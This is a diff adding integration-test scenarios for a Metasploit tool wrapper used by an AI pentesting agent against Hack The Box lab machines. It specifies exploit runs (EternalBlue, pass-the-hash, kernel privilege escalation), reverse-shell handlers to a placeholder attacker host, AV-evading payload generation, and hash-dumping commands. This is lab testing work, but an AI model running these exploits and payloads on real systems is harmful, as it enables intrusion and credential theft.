@@ -1,0 +1,1178 @@
+# Integration Scenarios: metasploit
+# Required HTB Machines: Blue (10.10.10.40), Devel (10.10.10.5), Optimum (10.10.10.8)
+# Recommended FIRST box: Blue (classic EternalBlue, exercises search_modules/check_vuln/
+#   run_exploit/handler/list_sessions/session_command/post_module in a single chain)
+# Prerequisites: Target reachable on VPN, msfrpcd running in container
+# Run with: pytest tests/tools/test_metasploit.py -m integration --tool=metasploit \
+#           --target=<IP> -v
+#
+# Data source: Trajectory analysis of 340 real metasploit calls across 9 engagements.
+#   Method calls: session_command=178, list_sessions=79, run_exploit=43,
+#     generate_payload=13, search_modules=11, handler=9, post_module=2, exec_command=2
+#   Agent confusion: 3 calls to non-existent methods (start_handler, console_command,
+#     run_command) -- all returned "method not found" errors gracefully
+#   Error data: 0 tool-level failures (all 340 returned toolSuccess=true), but many
+#     exploit attempts had exploit_success=false (especially local privesc modules)
+#   Real exploits used: web_delivery (14 runs), cve_2024_30088 (17 runs),
+#     cve_2024_35250 (6 runs), pgadmin_query_tool (3 runs), bad_successor (3 runs)
+#   Session commands observed: getuid (34), shell (9), execute (many variants),
+#     migrate (12), exit (6), ps (7), upload (6), hashdump, getsystem, load incognito
+#
+# Notes:
+# - Metasploit container takes 2+ minutes to start (msfrpcd init + 30-retry connect)
+# - Sessions persist across tool calls (service container via pymetasploit3 RPC)
+# - All exploit/handler/check methods run via msfrpcd shared console (-j for bg jobs)
+# - generate_payload uses msfvenom subprocess (stateless, most reliable method)
+# - Payload shortcuts: windows_reverse_tcp, windows_reverse_https, linux_reverse_tcp,
+#   linux_shell_tcp, php_reverse, java_reverse (resolved in _resolve_payload)
+# - _classify_msf_error returns (error_class, retryable, suggestions) for structured
+#   error handling: network (retryable), params (not), config (not)
+
+# =============================================================================
+# SEARCH MODULES SCENARIOS (search_modules)
+# =============================================================================
+
+## Scenario 1: Search for EternalBlue modules
+Method: search_modules
+Args: {query: "ms17_010"}
+Expected: success=true, count>=4, modules includes exploit/windows/smb/ms17_010_eternalblue and auxiliary/scanner/smb/smb_ms17_010
+Notes: Should find exploit, auxiliary, and admin modules for MS17-010.
+
+## Scenario 2: Search for PsExec modules
+Method: search_modules
+Args: {query: "psexec", type: "exploit"}
+Expected: success=true, count>=1, modules includes exploit/windows/smb/psexec
+Notes: PsExec is essential for pass-the-hash exploitation after obtaining NTLM hashes.
+
+## Scenario 3: Search for web_delivery modules
+Method: search_modules
+Args: {query: "web_delivery", type: "exploit"}
+Expected: success=true, count>=1, modules includes exploit/multi/script/web_delivery
+Notes: Web delivery generates download cradles. TARGET option selects language (2=PSH).
+
+## Scenario 4: Search for autoroute post module
+Method: search_modules
+Args: {query: "autoroute", type: "post"}
+Expected: success=true, count>=1, modules includes post/multi/manage/autoroute
+Notes: Autoroute is critical for pivoting through compromised hosts.
+
+## Scenario 5: Search for local privilege escalation modules
+Method: search_modules
+Args: {query: "suggest", type: "post"}
+Expected: success=true, count>=1, modules includes post/multi/recon/local_exploit_suggester
+Notes: Engagement data: agent searched for "suggest" to find privesc modules after landing shell.
+
+## Scenario 6: Search by CVE number
+# From engagement: agent searched for CVE-2024-30088 kernel LPE
+Method: search_modules
+Args: {query: "cve_2024_30088", type: "exploit"}
+Expected: success=true, count>=1, modules includes exploit/windows/local/cve_2024_30088_authz_basep
+Notes: CVE search is the primary discovery pattern for known vulnerabilities.
+
+## Scenario 7: Search for pgadmin exploit modules
+# From engagement: agent searched for pgadmin authenticated RCE
+Method: search_modules
+Args: {query: "pgadmin"}
+Expected: success=true, count>=1, modules includes exploit/multi/http/pgadmin_query_tool_authenticated
+Notes: Web app exploits often found by product name.
+
+## Scenario 8: Search for LDAP/AD exploitation modules
+# From engagement: agent searched for "bad_successor" dMSA attack
+Method: search_modules
+Args: {query: "bad_successor"}
+Expected: success=true, count>=1, modules includes auxiliary/admin/ldap/bad_successor
+Notes: Active Directory attack modules found by technique name.
+
+## Scenario 9: Search for nonexistent module
+Method: search_modules
+Args: {query: "zzzznonexistent999"}
+Expected: success=true, count=0, modules=[]
+Notes: Empty results should not cause errors. Verify clean empty state.
+
+## Scenario 10: Search for viewstate deserialization modules
+# From engagement: agent searched with multiple query terms
+Method: search_modules
+Args: {query: "viewstate deserialization"}
+Expected: success=true, count>=0
+Notes: Multi-word queries are common. Msf "search" handles space-separated terms.
+
+## Scenario 11: Search filtered by payload type
+Method: search_modules
+Args: {query: "reverse_tcp", type: "payload"}
+Expected: success=true, count>=10
+Notes: Payload type search to discover available reverse shells across platforms.
+
+# =============================================================================
+# VULNERABILITY CHECKING SCENARIOS (check_vuln)
+# =============================================================================
+
+## Scenario 12: MS17-010 vulnerability check (Blue)
+# Box: Blue (10.10.10.40) - Windows 7 SP1, SMB vulnerable to EternalBlue
+Method: check_vuln
+Args: {module: "auxiliary/scanner/smb/smb_ms17_010", rhosts: "10.10.10.40", timeout: 120}
+Expected: success=true, vulnerable=true, raw_output contains "VULNERABLE" or "[+]"
+Notes: Classic MS17-010 check. The [+] line with "VULNERABLE" triggers positive detection.
+  Parser logic: has_plus_vuln checks [+] lines, positive checks "is vulnerable"/"likely vulnerable",
+  negated checks "not appear vulnerable"/"not vulnerable"/"does not appear".
+
+## Scenario 13: MS17-010 check against non-vulnerable host (negative)
+Method: check_vuln
+Args: {module: "auxiliary/scanner/smb/smb_ms17_010", rhosts: "127.0.0.1", timeout: 30}
+Expected: success=true, vulnerable=false
+Notes: Localhost has no SMB service. Verifies absence of vuln keyword returns false.
+
+## Scenario 14: SMB version detection via auxiliary module
+Method: check_vuln
+Args: {module: "auxiliary/scanner/smb/smb_version", rhosts: "10.10.10.40", timeout: 60}
+Expected: success=true, raw_output contains Windows version info
+Notes: Not strictly a vuln check, but uses same module path structure. Used for
+  enumeration to determine OS version before selecting exploit.
+
+## Scenario 15: Check vuln with additional options (RPORT override)
+Method: check_vuln
+Args: {module: "auxiliary/scanner/http/http_version", rhosts: "10.10.10.8", options: {RPORT: 80}, timeout: 60}
+Expected: success=true, raw_output contains server info
+Notes: Tests the options dict passthrough (set KEY VALUE for each option).
+
+## Scenario 16: Check vuln with unreachable target
+Method: check_vuln
+Args: {module: "auxiliary/scanner/smb/smb_ms17_010", rhosts: "10.10.10.254", timeout: 30}
+Expected: success=true, vulnerable=false, raw_output contains timeout or connection error
+Notes: Should not crash. Network errors appear in raw_output, not as tool failures.
+  _classify_msf_error returns ("network", True, [...]) for timeout/unreachable patterns.
+
+## Scenario 17: Check vuln with "does NOT appear vulnerable" output (negation detection)
+# This tests the negation logic in check_vuln
+Method: check_vuln
+Args: {module: "auxiliary/scanner/smb/smb_ms17_010", rhosts: "10.10.10.8", timeout: 60}
+Expected: success=true, vulnerable=false, raw_output contains "does NOT appear vulnerable"
+Notes: Optimum is Win Server 2012 R2 (patched for MS17-010). Verifies negation phrases
+  are correctly detected: "not appear vulnerable", "not vulnerable", "does not appear".
+
+## Scenario 18: Check vuln with multiple RHOSTS (CIDR range)
+Method: check_vuln
+Args: {module: "auxiliary/scanner/smb/smb_ms17_010", rhosts: "10.10.10.0/24", timeout: 300}
+Expected: success=true, raw_output contains results for multiple hosts
+Notes: RHOSTS accepts CIDR notation. Long timeout needed for subnet scan.
+
+# =============================================================================
+# HANDLER SCENARIOS (handler / multi/handler)
+# =============================================================================
+
+## Scenario 19: Start Windows x86 meterpreter handler (payload shortcut)
+Method: handler
+Args: {payload: "windows_reverse_tcp", lhost: "<LHOST>", lport: 4444}
+Expected: success=true, handler_started=true, job_id is not null, payload="windows/meterpreter/reverse_tcp"
+Notes: Uses payload shortcut resolved via _resolve_payload(). ExitOnSession=false
+  is set automatically so handler survives after first connection.
+
+## Scenario 20: Start Windows x64 meterpreter handler (full payload name)
+# From engagement: 6 of 9 handler calls used x64 payload
+Method: handler
+Args: {payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4445}
+Expected: success=true, handler_started=true, job_id is not null
+Notes: x64 payload for 64-bit targets. Full payload name bypasses shortcut resolution.
+
+## Scenario 21: Start Linux shell handler
+Method: handler
+Args: {payload: "linux_shell_tcp", lhost: "<LHOST>", lport: 4446}
+Expected: success=true, handler_started=true, payload="linux/x64/shell_reverse_tcp"
+Notes: For non-meterpreter reverse shells (bash, python one-liners).
+
+## Scenario 22: Start HTTPS meterpreter handler
+Method: handler
+Args: {payload: "windows_reverse_https", lhost: "<LHOST>", lport: 8443}
+Expected: success=true, handler_started=true, payload="windows/meterpreter/reverse_https"
+Notes: HTTPS handler for encrypted C2 traffic. Useful when network monitoring is present.
+
+## Scenario 23: Start PHP meterpreter handler
+Method: handler
+Args: {payload: "php_reverse", lhost: "<LHOST>", lport: 4447}
+Expected: success=true, handler_started=true, payload="php/meterpreter/reverse_tcp"
+Notes: For PHP web shell payloads on Linux web servers.
+
+## Scenario 24: Start Java meterpreter handler
+Method: handler
+Args: {payload: "java_reverse", lhost: "<LHOST>", lport: 4448}
+Expected: success=true, handler_started=true, payload="java/meterpreter/reverse_tcp"
+Notes: For Java-based targets (Tomcat, Jenkins, etc.).
+
+## Scenario 25: Handler port conflict
+# Prerequisite: Scenario 19 is still running on port 4444
+Method: handler
+Args: {payload: "windows_reverse_tcp", lhost: "<LHOST>", lport: 4444}
+Expected: success=true, raw_output contains "Handler failed to bind" or "already in use"
+Notes: Port reuse should be detected and reported, not crash.
+  _classify_msf_error returns ("config", False, ["port is already in use..."]).
+
+## Scenario 26: Handler on high port (common for multi-handler stacking)
+# From engagement: agent used ports 9002, 9003, 9011, 9020 for separate handlers
+Method: handler
+Args: {payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 9003}
+Expected: success=true, handler_started=true
+Notes: Real engagement pattern: agents stack multiple handlers on different ports when
+  running parallel exploitation attempts or maintaining backup handlers.
+
+## Scenario 27: Handler with cmd/unix/reverse_bash payload
+Method: handler
+Args: {payload: "cmd/unix/reverse_bash", lhost: "<LHOST>", lport: 4449}
+Expected: success=true, handler_started=true
+Notes: Catches simple bash reverse shells. No shortcut -- uses full payload name.
+
+# =============================================================================
+# PAYLOAD GENERATION SCENARIOS (generate_payload / msfvenom)
+# =============================================================================
+
+## Scenario 28: Generate Windows x86 EXE payload
+Method: generate_payload
+Args: {payload: "windows/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4444, format: "exe"}
+Expected: success=true, size_bytes>5000, payload_base64 is not null, format="exe"
+Notes: Standard x86 Windows meterpreter for delivery via web upload or SMB.
+
+## Scenario 29: Generate Windows x64 EXE payload
+# From engagement: most common payload generated (9 of 13 calls)
+Method: generate_payload
+Args: {payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4444, format: "exe"}
+Expected: success=true, size_bytes>5000, payload_base64 is not null, format="exe"
+Notes: x64 is the standard for modern Windows targets.
+
+## Scenario 30: Generate Windows x64 shell (non-meterpreter) EXE
+# From engagement: used for simple shell callbacks when meterpreter was overkill
+Method: generate_payload
+Args: {payload: "windows/x64/shell_reverse_tcp", lhost: "<LHOST>", lport: 4445, format: "exe"}
+Expected: success=true, size_bytes>5000, format="exe"
+Notes: Plain reverse shell. Useful as fallback when meterpreter gets caught by AV.
+
+## Scenario 31: Generate Linux ELF payload
+Method: generate_payload
+Args: {payload: "linux/x64/shell_reverse_tcp", lhost: "<LHOST>", lport: 4446, format: "elf"}
+Expected: success=true, size_bytes>100, format="elf"
+Notes: Linux reverse shell binary for upload to compromised web server.
+
+## Scenario 32: Generate raw shellcode
+Method: generate_payload
+Args: {payload: "linux/x64/shell_reverse_tcp", lhost: "<LHOST>", lport: 4447, format: "raw"}
+Expected: success=true, size_bytes>0
+Notes: Raw shellcode for embedding in custom exploits or buffer overflow payloads.
+
+## Scenario 33: Generate Python meterpreter payload
+Method: generate_payload
+Args: {payload: "python/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4448, format: "raw"}
+Expected: success=true, size_bytes>0
+Notes: Python meterpreter for targets with Python installed (Linux servers, containers).
+
+## Scenario 34: Generate PowerShell command payload
+# From engagement: used psh-cmd format for in-memory execution
+Method: generate_payload
+Args: {payload: "windows/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4449, format: "psh-cmd"}
+Expected: success=true, size_bytes>0, format="psh-cmd"
+Notes: Generates a PowerShell one-liner command. Useful for command injection or
+  paste-and-execute scenarios. No file touch on disk.
+
+## Scenario 35: Generate payload with shikata_ga_nai encoding
+Method: generate_payload
+Args: {payload: "windows/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4450, format: "exe", encoder: "x86/shikata_ga_nai", iterations: 3}
+Expected: success=true, size_bytes>5000, encoder="x86/shikata_ga_nai"
+Notes: Encoded payload for AV evasion. Multiple iterations increase polymorphism.
+
+## Scenario 36: Generate payload with x64 XOR encoding
+# From engagement: agent used x64/xor_dynamic encoder
+Method: generate_payload
+Args: {payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4451, format: "exe", encoder: "x64/xor_dynamic", iterations: 1}
+Expected: success=true, size_bytes>5000, encoder="x64/xor_dynamic"
+Notes: x64-compatible encoder for 64-bit payloads. shikata_ga_nai is x86 only.
+
+## Scenario 37: Generate ASP payload (for IIS upload)
+Method: generate_payload
+Args: {payload: "windows/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4452, format: "asp"}
+Expected: success=true, size_bytes>0, format="asp"
+Notes: Classic ASP payload for upload to legacy IIS web servers.
+
+## Scenario 38: Generate ASPX payload (for IIS upload)
+Method: generate_payload
+Args: {payload: "windows/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4453, format: "aspx"}
+Expected: success=true, size_bytes>0, format="aspx"
+Notes: ASPX payload for modern IIS. Used in Devel HTB box scenario.
+
+## Scenario 39: Generate JSP payload (for Tomcat/Java servers)
+Method: generate_payload
+Args: {payload: "java/jsp_shell_reverse_tcp", lhost: "<LHOST>", lport: 4454, format: "raw"}
+Expected: success=true, size_bytes>0
+Notes: JSP payload for upload to Tomcat manager or similar Java web servers.
+
+## Scenario 40: Generate WAR payload (for Tomcat deploy)
+Method: generate_payload
+Args: {payload: "java/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4455, format: "war"}
+Expected: success=true, size_bytes>0, format="war"
+Notes: WAR file for deployment via Tomcat manager. Auto-deploys and executes.
+
+## Scenario 41: Generate DLL payload (for DLL sideloading/injection)
+Method: generate_payload
+Args: {payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4456, format: "dll"}
+Expected: success=true, size_bytes>5000, format="dll"
+Notes: DLL payload for sideloading attacks or process injection scenarios.
+
+## Scenario 42: Generate MSI payload (for msiexec delivery)
+Method: generate_payload
+Args: {payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4457, format: "msi"}
+Expected: success=true, size_bytes>5000, format="msi"
+Notes: MSI payload executed via msiexec /q /i. Useful for AppLocker bypass.
+
+## Scenario 43: Generate C shellcode
+Method: generate_payload
+Args: {payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4458, format: "c"}
+Expected: success=true, size_bytes>0, format="c"
+Notes: C-formatted shellcode for embedding in custom loaders or compiled exploits.
+
+## Scenario 44: Generate PHP payload
+Method: generate_payload
+Args: {payload: "php/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4459, format: "raw"}
+Expected: success=true, size_bytes>0
+Notes: PHP meterpreter for upload as web shell on PHP-based targets.
+
+## Scenario 45: Generate VBA payload (for Office macro delivery)
+Method: generate_payload
+Args: {payload: "windows/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4460, format: "vba"}
+Expected: success=true, size_bytes>0, format="vba"
+Notes: VBA macro payload for embedding in Office documents (phishing scenarios).
+
+## Scenario 46: Generate payload with invalid format
+Method: generate_payload
+Args: {payload: "windows/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4461, format: "invalid_format"}
+Expected: success=false, error contains format-related message
+Notes: msfvenom should fail with invalid format. Verify error propagation.
+
+## Scenario 47: Generate payload with nonexistent payload name
+Method: generate_payload
+Args: {payload: "windows/fake/nonexistent_payload", lhost: "<LHOST>", lport: 4462, format: "exe"}
+Expected: success=false, error contains "Invalid payload" or payload-related message
+Notes: msfvenom should fail cleanly on unknown payload path.
+
+## Scenario 48: Generate payload using shortcut name
+Method: generate_payload
+Args: {payload: "linux_reverse_tcp", lhost: "<LHOST>", lport: 4463, format: "elf"}
+Expected: success=true, format="elf", data.payload="linux/x64/meterpreter/reverse_tcp"
+Notes: Tests _resolve_payload() shortcut for linux meterpreter.
+
+## Scenario 49: Generate stageless Windows payload
+Method: generate_payload
+Args: {payload: "windows/x64/meterpreter_reverse_tcp", lhost: "<LHOST>", lport: 4464, format: "exe"}
+Expected: success=true, size_bytes>200000
+Notes: Stageless payload (note underscore vs slash before reverse_tcp). Much larger
+  than staged (~200KB+ vs ~10KB). Preferred when network is unreliable.
+
+# =============================================================================
+# EXPLOITATION SCENARIOS (run_exploit)
+# =============================================================================
+
+## Scenario 50: EternalBlue exploitation (Blue)
+# Box: Blue (10.10.10.40) - Windows 7 SP1 x64
+# Prerequisite: Scenario 12 confirms vulnerability, handler running
+Method: run_exploit
+Args: {module: "exploit/windows/smb/ms17_010_eternalblue", rhosts: "10.10.10.40", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4444, timeout: 120}
+Expected: success=true, exploit_success=true, session_count>=1, sessions[0].type="meterpreter"
+Notes: Classic EternalBlue. Session snapshot before/after detects new sessions.
+  exploit -j runs as background job. 3-second sleep after for session establishment.
+  May need 2-3 attempts (race condition in kernel exploit).
+
+## Scenario 51: PsExec with pass-the-hash (Blue)
+# Box: Blue (10.10.10.40)
+# Prerequisite: NTLM hash obtained from hashdump post-exploitation
+Method: run_exploit
+Args: {module: "exploit/windows/smb/psexec", rhosts: "10.10.10.40", payload: "windows/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4451, options: {SMBUser: "Administrator", SMBPass: "aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>", SMBDomain: "."}, timeout: 120}
+Expected: success=true, exploit_success=true, session_count>=1
+Notes: Pass-the-hash via PsExec. Requires Administrator NTLM hash from prior hashdump.
+  Options dict sets SMBUser/SMBPass/SMBDomain via "set KEY VALUE" commands.
+
+## Scenario 52: Web delivery exploit - PowerShell target (Devel)
+# Box: Devel (10.10.10.5)
+# Prerequisite: FTP anonymous upload access to wwwroot
+Method: run_exploit
+Args: {module: "exploit/multi/script/web_delivery", rhosts: "<LHOST>", payload: "windows/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4452, options: {SRVHOST: "<LHOST>", SRVPORT: 8080, TARGET: 2}, timeout: 120}
+Expected: success=true, raw_output contains PowerShell download cradle URL
+Notes: TARGET=2 selects PowerShell delivery. Generates a one-liner the target
+  must execute. Agent extracts URL from output for use in next step.
+
+## Scenario 53: Web delivery with SRVHOST 0.0.0.0
+# From engagement: most common pattern (bind to all interfaces)
+Method: run_exploit
+Args: {module: "exploit/multi/script/web_delivery", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4453, options: {SRVHOST: "0.0.0.0", SRVPORT: 8888, TARGET: 2}, timeout: 120}
+Expected: success=true, raw_output contains download cradle
+Notes: SRVHOST 0.0.0.0 binds to all interfaces. RHOSTS is not set because
+  web_delivery is a server-side exploit (victim connects to us).
+
+## Scenario 54: Web delivery with DisablePayloadHandler
+# From engagement: used when handler is started separately
+Method: run_exploit
+Args: {module: "exploit/multi/script/web_delivery", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4454, options: {SRVHOST: "0.0.0.0", SRVPORT: 8889, TARGET: 2, DisablePayloadHandler: "true"}, timeout: 120}
+Expected: success=true, raw_output contains download cradle
+Notes: DisablePayloadHandler=true prevents duplicate handler. Use when handler
+  was started separately via handler method on the same port.
+
+## Scenario 55: Local privilege escalation exploit (CVE-2024-30088)
+# From engagement: most-used exploit module (17 runs with various options)
+# Prerequisite: Meterpreter session on target Windows machine
+Method: run_exploit
+Args: {module: "exploit/windows/local/cve_2024_30088_authz_basep", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4455, options: {SESSION: "1"}, timeout: 300}
+Expected: success=true, session_count>=0 (kernel exploit, may need retries)
+Notes: Windows kernel LPE. Engagement showed many retries with different options:
+  AutoCheck=false, WfsDelay=120-600, RETRIES=10, DisablePayloadHandler=true.
+  Reliability is low -- expect multiple attempts.
+
+## Scenario 56: Local privesc with extended options
+# From engagement: tuning attempts for unreliable kernel exploit
+Method: run_exploit
+Args: {module: "exploit/windows/local/cve_2024_30088_authz_basep", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4456, options: {SESSION: "1", AutoCheck: "false", WfsDelay: "300", RETRIES: "10"}, timeout: 600}
+Expected: success=true (tool level), exploit_success varies
+Notes: AutoCheck=false skips pre-check. WfsDelay extends wait for session.
+  Real engagement: agent tried SESSION IDs 1-28 across 17 attempts.
+
+## Scenario 57: Local privesc with exec payload (no reverse shell)
+# From engagement: used windows/x64/exec to run commands as SYSTEM
+Method: run_exploit
+Args: {module: "exploit/windows/local/cve_2024_30088_authz_basep", payload: "windows/x64/exec", lhost: "<LHOST>", lport: 4457, options: {SESSION: "1", AutoCheck: "false", WfsDelay: "60", DisablePayloadHandler: "true", CMD: "cmd.exe /c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Users\\Public\\flag.txt"}, timeout: 120}
+Expected: success=true (tool level), no new session (exec payload runs and exits)
+Notes: windows/x64/exec runs a single command as the elevated user. Useful when
+  reverse shell fails but exploit itself works. Command output captured via file.
+
+## Scenario 58: Local privesc - CVE-2024-35250 KS driver
+# From engagement: 6 runs with various TARGET and WfsDelay values
+Method: run_exploit
+Args: {module: "exploit/windows/local/cve_2024_35250_ks_driver", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4458, options: {SESSION: "1", TARGET: "1"}, timeout: 300}
+Expected: success=true (tool level), session_count>=0
+Notes: Another kernel LPE. Engagement showed TARGET values 0 and 1 tried.
+  WfsDelay up to 180 used. AutoCheck=False sometimes necessary.
+
+## Scenario 59: Authenticated web app exploit (pgadmin)
+# From engagement: 3 runs with pgadmin authenticated RCE
+Method: run_exploit
+Args: {module: "exploit/multi/http/pgadmin_query_tool_authenticated", payload: "python/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4459, options: {RPORT: 80, USERNAME: "admin@target.htb", PASSWORD: "password123", VHOST: "db-mgmt.target.htb"}, timeout: 120}
+Expected: success=true, session_count>=0
+Notes: Authenticated exploits require valid credentials from prior enumeration.
+  VHOST required for virtual host routing. Multiple payload types tried
+  in engagement (cmd/unix/reverse_bash, python/meterpreter/reverse_tcp).
+
+## Scenario 60: Auxiliary module via run_exploit (AD attack)
+# From engagement: bad_successor dMSA attack via run_exploit
+Method: run_exploit
+Args: {module: "auxiliary/admin/ldap/bad_successor", rhosts: "10.10.10.40", options: {USERNAME: "user", PASSWORD: "pass", DOMAIN: "target.htb", ACTION: "CREATE_DMSA", TARGET_USER: "Administrator"}, timeout: 120}
+Expected: success=true, raw_output contains dMSA creation results
+Notes: run_exploit works for auxiliary modules too (uses console). Engagement
+  showed 3 calls with ACTION values: CREATE_DMSA, GET_TICKET.
+
+## Scenario 61: HFS Rejetto exploitation (Optimum)
+# Box: Optimum (10.10.10.8) - Windows Server 2012 R2, HFS 2.3
+Method: run_exploit
+Args: {module: "exploit/windows/http/rejetto_hfs_exec", rhosts: "10.10.10.8", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4460, options: {RPORT: 80}, timeout: 120}
+Expected: success=true, exploit_success=true, session_count>=1
+Notes: Rejetto HFS remote code execution. Should get user-level meterpreter.
+
+## Scenario 62: Exploit against unreachable target
+Method: run_exploit
+Args: {module: "exploit/windows/smb/ms17_010_eternalblue", rhosts: "10.10.10.254", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4461, timeout: 30}
+Expected: success=true, exploit_success=false, session_count=0, raw_output contains "refused" or "timed out"
+Notes: Exploit should complete without crashing. Error in raw_output, not tool failure.
+
+## Scenario 63: Exploit with unknown datastore option
+Method: run_exploit
+Args: {module: "exploit/windows/smb/ms17_010_eternalblue", rhosts: "10.10.10.40", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4462, options: {FAKE_OPTION: "value"}, timeout: 30}
+Expected: success=true, raw_output contains "Unknown datastore option"
+Notes: Invalid options should be reported in raw_output. _classify_msf_error
+  returns ("params", False, ["option name may be misspelled..."]).
+
+## Scenario 64: Exploit with missing required payload options
+Method: run_exploit
+Args: {module: "exploit/windows/smb/ms17_010_eternalblue", rhosts: "10.10.10.40", timeout: 30}
+Expected: success=true, exploit_success=false, raw_output contains error about missing options
+Notes: No payload/lhost/lport specified. Exploit may use defaults or fail gracefully.
+
+## Scenario 65: Exploit with module not found
+Method: run_exploit
+Args: {module: "exploit/fake/nonexistent/module", rhosts: "10.10.10.40", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "<LHOST>", lport: 4463, timeout: 30}
+Expected: success=true, raw_output contains "not found" or "Failed to load"
+Notes: _classify_msf_error returns ("config", False, ["Use search_modules..."]).
+
+# =============================================================================
+# COMMAND EXECUTION SCENARIOS (exec_command)
+# =============================================================================
+
+## Scenario 66: Remote command via webapp exploit
+# Requires a target with command injection vulnerability
+Method: exec_command
+Args: {module: "exploit/unix/webapp/php_cgi_arg_injection", rhosts: "10.10.10.5", command: "id", options: {RPORT: 80, TARGETURI: "/"}, timeout: 60}
+Expected: success=true, exploit_success varies, command_output may contain "uid="
+Notes: One-shot command execution without persistent session. Uses cmd/unix/generic payload.
+  Output extraction: captures lines after [+]/[*] markers containing "executing"/"command".
+
+## Scenario 67: Remote command via HFS (Optimum)
+Method: exec_command
+Args: {module: "exploit/windows/http/rejetto_hfs_exec", rhosts: "10.10.10.8", command: "whoami", options: {RPORT: 80}, timeout: 60}
+Expected: success=true, command_output may contain username
+Notes: Tests Windows command execution. cmd/unix/generic may not work on Windows --
+  this tests the edge case. HFS may need specific payload handling.
+
+## Scenario 68: Remote command with long output
+Method: exec_command
+Args: {module: "exploit/unix/webapp/php_cgi_arg_injection", rhosts: "10.10.10.5", command: "cat /etc/passwd", options: {RPORT: 80, TARGETURI: "/"}, timeout: 60}
+Expected: success=true, command_output contains multiple lines if successful
+Notes: Tests that multi-line command output is properly captured and returned.
+
+## Scenario 69: exec_command with missing module parameter
+# From engagement: agent called exec_command without module (confusion pattern)
+Method: exec_command
+Args: {command: "which gcc", timeout: 30}
+Expected: success=false or error about missing required parameter
+Notes: Engagement showed agent confusion: tried to use exec_command as a local
+  shell executor. The module parameter is required.
+
+# =============================================================================
+# SESSION LISTING SCENARIOS (list_sessions)
+# =============================================================================
+
+## Scenario 70: List sessions when none exist
+Method: list_sessions
+Args: {}
+Expected: success=true, count=0, sessions=[]
+Notes: Clean state. Most common check (79 calls in engagement data, majority empty).
+
+## Scenario 71: List sessions with active meterpreter
+# Prerequisite: Meterpreter session from exploitation
+Method: list_sessions
+Args: {}
+Expected: success=true, count>=1, sessions[0] has id, type, info, tunnel_local, tunnel_peer, via_exploit, via_payload, platform, arch
+Notes: Verifies all 8 session fields are populated. Sessions use msfrpcd RPC
+  (self.client.sessions.list), keys may be int or str due to msgpack.
+
+## Scenario 72: List sessions with mixed types (meterpreter + shell)
+# Prerequisite: Both meterpreter and shell sessions active
+Method: list_sessions
+Args: {}
+Expected: success=true, count>=2, session types include both "meterpreter" and "shell"
+Notes: Common scenario during exploitation: meterpreter for primary, shell from
+  web_delivery or one-liner.
+
+## Scenario 73: List sessions after session death
+# Prerequisite: Session established and then killed
+Method: list_sessions
+Args: {}
+Expected: success=true, dead session may or may not appear depending on msfrpcd state
+Notes: Engagement showed frequent polling (79 calls). Dead sessions are cleaned up
+  by msfrpcd eventually but may linger briefly.
+
+## Scenario 74: List sessions with high session IDs
+# From engagement: session IDs went up to 29
+Method: list_sessions
+Args: {}
+Expected: success=true, session IDs are integers, may be non-sequential
+Notes: Session IDs increment per msfrpcd lifetime. After many exploit attempts,
+  IDs can be high (20+) even with few active sessions.
+
+# =============================================================================
+# SESSION COMMAND SCENARIOS (session_command)
+# =============================================================================
+
+## Scenario 75: getuid in meterpreter session
+# Prerequisite: Meterpreter session established
+Method: session_command
+Args: {session_id: 1, command: "getuid", timeout: 30}
+Expected: success=true, output contains "Server username:" or username
+Notes: Most common session command (34 of 178 calls). Uses MeterpreterSession.run_with_output().
+
+## Scenario 76: sysinfo in meterpreter session
+Method: session_command
+Args: {session_id: 1, command: "sysinfo", timeout: 30}
+Expected: success=true, output contains "Computer", "OS", "Architecture"
+Notes: Gathers target system information. Essential for selecting further attacks.
+
+## Scenario 77: getpid in meterpreter session
+Method: session_command
+Args: {session_id: 1, command: "getpid", timeout: 15}
+Expected: success=true, output contains process ID number
+Notes: Check current process ID before migration.
+
+## Scenario 78: getprivs in meterpreter session
+Method: session_command
+Args: {session_id: 1, command: "getprivs", timeout: 30}
+Expected: success=true, output contains list of privileges
+Notes: Shows enabled privileges. Look for SeDebugPrivilege, SeImpersonatePrivilege
+  for privilege escalation potential.
+
+## Scenario 79: getsystem - automated privilege escalation
+Method: session_command
+Args: {session_id: 1, command: "getsystem", timeout: 60}
+Expected: success=true, output indicates success or failure
+Notes: Tries multiple privesc techniques (named pipe, token duplication).
+  Only works from certain privilege levels.
+
+## Scenario 80: hashdump - dump NTLM hashes
+# Prerequisite: SYSTEM-level meterpreter session
+Method: session_command
